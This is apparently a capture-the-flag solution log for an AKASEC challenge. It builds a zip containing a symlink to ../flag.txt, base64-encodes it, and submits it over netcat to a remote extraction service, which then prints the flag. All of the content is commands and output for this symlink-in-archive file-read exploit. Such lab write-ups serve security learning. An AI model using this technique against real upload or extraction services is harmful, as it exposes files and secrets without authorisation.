```
$ sudo ln -s ../flag.txt a.txt
$ zip -ry ./solve.zip a.txt 
$ base64 -w 1000 ./solve.zip 
UEsDBAoAAAAAANtaylh5zQKiCwAAAAsAAAAFABwAYS50eHRVVAkAA31jZmZ9Y2ZmdXgLAAEEAAAAAAQAAAAALi4vZmxhZy50eHRQSwECHgMKAAAAAADbWspYec0CogsAAAALAAAABQAYAAAAAAAAAAAA/6EAAAAAYS50eHRVVAUAA31jZmZ1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBLAAAASgAAAAAA
$ nc 172.210.129.230 1349
include your zip file (base64)>> UEsDBAoAAAAAANtaylh5zQKiCwAAAAsAAAAFABwAYS50eHRVVAkAA31jZmZ9Y2ZmdXgLAAEEAAAAAAQAAAAALi4vZmxhZy50eHRQSwECHgMKAAAAAADbWspYec0CogsAAAALAAAABQAYAAAAAAAAAAAA/6EAAAAAYS50eHRVVAUAA31jZmZ1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBLAAAASgAAAAAA
-- content/a.txt 
------------------------------------------------------------------------

AKASEC{I7_wa5_700_0BVi0u5_ri9H7?}

------------------------------------------------------------------------
```
flag: `AKASEC{I7_wa5_700_0BVi0u5_ri9H7?}`
